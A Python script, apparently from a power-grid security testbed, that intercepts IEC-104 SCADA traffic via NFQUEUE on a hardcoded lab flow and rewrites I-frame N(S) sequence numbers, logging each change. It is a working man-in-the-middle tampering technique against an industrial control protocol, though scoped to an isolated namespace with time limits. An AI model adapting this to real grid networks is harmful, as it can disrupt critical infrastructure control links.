#!/usr/bin/env python3
"""Lab-bound IEC-104 APCI integrity experiment. RUN ONLY IN pu-s04-transit.

Modifies genuine I-frame N(S) within the isolated 10.104.2.2:2404 -> 10.104.1.2
flow using NFQUEUE. No packet generator, no arbitrary-target CLI and no other routes.
Requires python packages NetfilterQueue and scapy on the Scenario 04 test VM.
This is a source-level candidate; test actual runtime behaviour before scoring.
"""
import argparse
import json
import signal
import time
from pathlib import Path
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

LOG = Path('/var/log/prabal-urja/scenario4/apci-research.jsonl')
SOURCE = '10.104.2.2'
DEST = '10.104.1.2'
COUNT = 0


def handler(packet):
    global COUNT
    try:
        ip = IP(packet.get_payload())
        if ip.src != SOURCE or ip.dst != DEST or not ip.haslayer(TCP):
            return packet.accept()
        tcp = ip[TCP]
        if tcp.sport != 2404 or not tcp.haslayer(Raw):
            return packet.accept()
        payload = bytearray(bytes(tcp[Raw].load))
        if len(payload) < 6 or payload[0] != 0x68 or (payload[2] & 1):
            return packet.accept()
        if payload[1] < 4 or len(payload) < payload[1] + 2:
            return packet.accept()
        before = int.from_bytes(payload[2:4], 'little') >> 1
        after = (before + 2000) % 32768
        payload[2:4] = (after << 1).to_bytes(2, 'little')
        tcp[Raw].load = bytes(payload)
        del ip.len
        del ip.chksum
        del tcp.chksum
        packet.set_payload(bytes(ip))
        COUNT += 1
        if COUNT <= 10:
            rec = {'time_epoch': time.time(), 'type': 'APCI_N_S_MODIFIED',
                   'src': SOURCE, 'dst': DEST, 'old_n_s': before, 'new_n_s': after}
            LOG.parent.mkdir(parents=True, exist_ok=True)
            with LOG.open('a') as f:
                f.write(json.dumps(rec) + '\n')
            print('LAB_APCI_CHANGED old=%d new=%d count=%d' % (before, after, COUNT), flush=True)
    except Exception as ex:
        print('PACKET_INSPECTION_ERROR: ' + str(ex), flush=True)
    packet.accept()


def main():
    p = argparse.ArgumentParser()
    p.add_argument('--duration', type=int, default=95)
    args = p.parse_args()
    if not 45 <= args.duration <= 180:
        p.error('duration must be 45..180 seconds')
    ns = Path('/var/run/netns/pu-s04-transit')
    if not ns.is_file():
        p.error('Scenario 04 transit namespace mount not found')
    print('LAB_ONLY flow=10.104.2.2:2404->10.104.1.2 duration=%ds' % args.duration, flush=True)
    queue = NetfilterQueue()
    queue.bind(104, handler)
    def timeout(_a, _b):
        raise TimeoutError('Experiment duration reached')
    old = signal.signal(signal.SIGALRM, timeout)
    signal.alarm(args.duration)
    try:
        queue.run()
    except TimeoutError:
        pass
    finally:
        signal.alarm(0)
        signal.signal(signal.SIGALRM, old)
        queue.unbind()
    print('LAB_APCI_TOTAL_MODIFIED=%d' % COUNT)
    return 0 if COUNT else 2

if __name__ == '__main__':
    raise SystemExit(main())
